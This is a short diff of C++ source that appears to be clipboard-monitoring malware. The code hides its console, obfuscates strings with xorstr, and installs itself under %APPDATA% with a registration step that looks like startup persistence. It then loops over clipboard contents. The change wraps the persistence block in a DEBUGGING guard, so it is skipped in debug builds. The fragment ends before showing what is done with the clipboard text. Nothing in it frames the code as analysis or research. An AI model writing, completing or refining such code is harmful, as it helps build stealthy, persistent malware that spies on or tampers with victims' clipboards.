@@ -13,6 +13,7 @@ int main() {
             hide_console();
 #endif
 
+#ifndef DEBUGGING
         std::string appdata = getenv(xorstr("APPDATA"));
         appdata += xorstr("\\") + path;
 
@@ -30,7 +31,9 @@ int main() {
             if (!Check(register_name.c_str())) {
                 Register(register_name.c_str(), s2ws(appdata).c_str(), L"");
             }
+
         }
+#endif
 
         while (true) {
             std::string clipboard = get_clipboard_text();
